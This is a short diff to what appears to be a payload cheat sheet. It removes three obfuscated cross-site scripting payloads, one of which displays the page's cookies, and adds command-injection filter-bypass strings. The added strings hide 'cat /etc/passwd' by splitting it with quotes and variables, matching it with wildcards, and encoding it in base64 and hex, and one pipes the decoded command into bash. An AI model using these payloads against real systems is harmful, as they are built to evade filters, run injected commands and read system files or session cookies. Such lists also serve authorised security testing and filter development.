@@ -1,3 +1,6 @@
-<a"/onclick=(confirm)()>click
-<a href="j&Tab;a&Tab;v&Tab;asc&NewLine;ri&Tab;pt&colon;\u0061\u006C\u0065\u0072\u0074&lpar;this['document']['cookie']&rpar;">X</a>
-<--`<img/src=` onerror=confirm``> --!>
+c’at’ /’e’’t’c/passwd == cat /etc/passwd
+x=google.com$x&$y&$x/bin$y/cat $a/etc$b/passwd$h for /bin/cat /etc/passwd
+command -v /b??/c??
+echo+’Y2F0IC9ldGMvcGFzc3dk’$a|$x/’u’sr/b?n%y/bas’e’64+-d$z|bash$c
+cat /etc/passwd == 636174202f6574632f706173737764
+x=google.com$x|$y|ls$z -la for ls -la
